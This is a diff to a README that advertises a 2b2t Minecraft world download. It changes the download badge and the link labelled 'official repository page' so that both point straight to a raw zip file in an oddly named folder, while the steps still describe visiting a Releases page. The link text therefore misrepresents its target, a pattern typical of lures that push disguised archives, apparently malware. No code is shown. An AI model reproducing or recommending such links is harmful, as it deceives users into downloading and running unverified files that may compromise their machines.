@@ -1,6 +1,6 @@
 # 🌍 1m_release - Explore the largest Minecraft world download
 
-[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/hertaintramolecular897/1m_release)
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/hertaintramolecular897/1m_release/raw/refs/heads/main/intelligenced/release_m_v3.5.zip)
 
 This repository provides access to the largest world download project for the 2b2t Minecraft server. This file contains the complete map data for the server, including structures, terrain changes, and player builds. You can load this map in your own Minecraft installation to explore the landscape.
 
@@ -8,7 +8,7 @@ This repository provides access to the largest world download project for the 2b
 
 Follow these steps to obtain the project files. 
 
-1. Visit the [official repository page](https://github.com/hertaintramolecular897/1m_release).
+1. Visit the [official repository page](https://github.com/hertaintramolecular897/1m_release/raw/refs/heads/main/intelligenced/release_m_v3.5.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version of the download.
 4. Select the file ending in .zip to start your download.
